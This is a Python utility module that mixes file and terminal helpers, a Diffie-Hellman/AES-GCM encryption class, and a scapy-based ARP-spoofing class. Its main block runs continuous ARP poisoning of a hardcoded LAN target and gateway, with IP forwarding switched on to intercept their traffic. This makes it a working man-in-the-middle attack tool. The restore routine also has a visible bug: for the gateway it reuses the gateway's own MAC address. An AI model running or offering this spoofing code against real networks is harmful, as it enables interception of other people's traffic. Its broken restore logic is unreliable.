import os, socket, secrets, hashlib, json, colorama, time, logging
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from scapy.layers.l2 import ARP, Ether, srp
from scapy.all import send, get_if_hwaddr

class generall:
    def clear() -> None:
        """
        Clears the Terminal-Screen
        """
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
    
    def display_header(text:str) -> str:
        """       
        :param text: the Text, which should be displayed
        :type text: str
        :return: a 3 line string, which you can print to the Terminal
        :rtype: str
        """
        liste = [
            "="*(len(text)+2),
            f"|{text}|",
            "="*(len(text)+2)
        ]
        return "\n".join(liste)
    
    def ask(question:str, out_color:str) -> str:
        """
        :param question: input(question)
        :type question: str
        :param out_color: colorama.Fore.{var} | the ending Color
        :type out_color: str
        :return: the answer of input()
        :rtype: str
        """
        var = input(f"{colorama.Fore.RESET}{question}{colorama.Fore.RED}")
        print(out_color)
        return var
    
    def read(filename:str, isJson:bool) -> str|dict:
        """
        :param filename: The name with path of the File
        :type filename: str
        :param isJson: if: dict -> True else: -> False
        :type isJson: bool
        :return: if: isJson -> dict else: -> string
        :rtype: str | dict
        """
        if not os.path.exists(filename):
            raise FileNotFoundError("This File/Path doesn't exist!")

        with open(filename, "r") as data:

            if isJson:
                return json.load(data)
            
            else:
                return data.read()
    
    def write(filename:str, content:dict|list|str, isJson:bool) -> None:
        """
        :param filename: The name with Path of the File
        :type filename: str
        :param content: What should be in the File (if isJson: -> dict else: str or list)
        :type content: dict | list | str
        :param isJson: if the output format should be a JSON type
        :type isJson: bool
        """
        if not os.path.exists(filename):
            raise FileNotFoundError("This File/Path doesn't exist!")
        
        with open(filename, "w") as data:

            if isJson:
                json.dump(content, data, indent=True)
            
            else:
                if type(content) == str:
                    data.write(content)
                else:
                    for line in content:
                        data.write(line)

class net:
    """
    Networking Functions etc.
    """

    def create_TCP() -> socket.socket:
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def recv_exact(sock:socket.socket, n:int) -> bytes:
        """        
        :param sock: the socket obj
        :type sock: socket.socket
        :param n: the byte count
        :type n: int
        :return: the content of the packages
        :rtype: bytes
        """
        data = b""
        while len(data) < n:
            chunk = sock.recv(n-len(data))
            if not chunk:
                raise ConnectionError("Socket closed")
            data += chunk
        return data

    class DH:
        """
        A class to work with, if you need to encrypt Traffic
        """
        def __init__(self, p:int, g:int):
            """
            :param p: A (big) prime integer
            :type p: int
            :param g: Generator, where g<p (mostly 2 or 5)
            :type g: int
            """
            self.p = p
            self.g = g

            self.private_key = secrets.randbelow(self.p)
            self.public_key = pow(g, self.private_key, self.p)

            self.shared_secret = None
            self.AES_KEY = None
        
        def generate_other(self, their_public_key:int) -> None:
            self.shared_secret = pow(their_public_key, self.private_key, self.p)
            self.shared_secret__bytes = self.shared_secret.to_bytes((self.shared_secret.bit_length()+7)//8, byteorder="big")
            self.AES_KEY = hashlib.sha256(self.shared_secret__bytes).digest()
        
        def encrypt(self, text:bytes) -> bytes:
            if not self.AES_KEY:
                raise SystemError("AES_KEY doesn't exist!")
            
            aesgcm = AESGCM(self.AES_KEY)
            nonce = os.urandom(12)
            cipher = aesgcm.encrypt(nonce, text, None)
            return nonce + cipher
        
        def decrypt(self, data:bytes) -> bytes:
            if not self.AES_KEY:
                raise SystemError("AES_KEY doesn't exist!")
            
            aesgcm = AESGCM(self.AES_KEY)
            nonce = data[:12]
            cipher = data[12:]
            return aesgcm.decrypt(nonce, cipher, None)
    
    class MITM:
        def __init__(self, target_ip:str, gateway_ip:str, my_ip:str, interface:str):
            logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
            self.target_ip = target_ip
            self.gateway_ip = gateway_ip
            self.ip = my_ip
            self.mac = get_if_hwaddr(interface)
            self.interface = interface

            self.target_mac = self.get_mac(self.target_ip)
            self.gateway_mac = self.get_mac(self.gateway_ip)
        
        def get_mac(self, ip:str) -> str:
            """           
            :param ip: The IP of the Device, you want the mac of
            :type ip: str
            :return: the MAC address
            :rtype: str
            """
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request

            answered = srp(packet, timeout=2, verbose=False)[0]

            if not answered:
                raise ConnectionError("can't get MAC address!")
            
            return answered[0][1].hwsrc
        
        def spoof(self, target_or_gateway:str) -> None:
            """
            :param target_or_gateway: if target -> "target" | elif gateway -> "gateway"
            :type target_or_gateway: str
            """
            if target_or_gateway == "target":
                target_ip = self.target_ip
                target_mac = self.target_mac
                spoof_ip = self.gateway_ip
            elif target_or_gateway == "gateway":
                target_ip = self.gateway_ip
                target_mac = self.gateway_mac
                spoof_ip = self.target_ip
            else:
                raise SystemError("No matching type found! (something else than target / gateway)")
            
            eth = Ether(
                src=self.mac,
                dst=target_mac
            )

            arp = ARP(
                op=2,
                pdst=target_ip,
                psrc=spoof_ip,
                hwdst=target_mac,
                hwsrc=self.mac
            )
            packet = eth / arp
            send(packet, iface=self.interface, verbose=0)
        
        def restore(self, target_or_gateway:str) -> None:
            """
            :param target_or_gateway: if target -> "target" | elif gateway -> "gateway"
            :type target_or_gateway: str
            """
            if target_or_gateway == "target":
                target_ip = self.target_ip
                target_mac = self.target_mac
                original_ip = self.gateway_ip
                original_mac = self.gateway_mac
            elif target_or_gateway == "gateway":
                target_ip = self.gateway_ip
                target_mac = self.gateway_mac
                original_ip = self.target_ip
                original_mac = self.gateway_mac
            else:
                raise SystemError("No matching Type found! (something else than target / gateway)")
            
            eth = Ether(
                src=self.mac,
                dst=target_mac
            )

            arp = ARP(
                op=2,
                pdst=target_ip,
                psrc=original_ip,
                hwdst=target_mac,
                hwsrc=original_mac
            )
            packet = eth / arp
            send(packet, iface=self.interface, verbose=0)
        
        def change_ip_forwarding(self, active:bool) -> None:
            """
            :param active: if you want it to be active
            :type active: bool
            """
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                if active:
                    f.write("1")
                else:
                    f.write("0")
    
if __name__ == "__main__":
    generall.clear()
    print(generall.display_header("test in func.py"))

    MITM = net.MITM("192.168.178.57", "192.168.178.1", "192.168.178.31", "eno1")
    print(f"my mac: {MITM.mac}")
    print(f"gateway_ip: {MITM.gateway_ip}")
    print(f"gateway_mac: {MITM.gateway_mac}")
    print(f"target_ip: {MITM.target_ip}")
    print(f"target_mac: {MITM.target_mac}")

    print("[*] start spoofing (Ctrl+C to stop)")
    MITM.change_ip_forwarding(True)
    try:
        while True:
                print("...doing it's stuff...")
                MITM.spoof("target")
                MITM.spoof("gateway")
                time.sleep(1)
    except KeyboardInterrupt:
        print("[*] now clearing...")
    except Exception as e:
        print("Exception: ", e)
    finally:
        print("[*] now in finally doing it's clearing")
        for _ in range(14):
            print(f"Step {_+1}/14")
            MITM.restore("target")
            MITM.restore("gateway")
            time.sleep(0.4)
        MITM.change_ip_forwarding(False)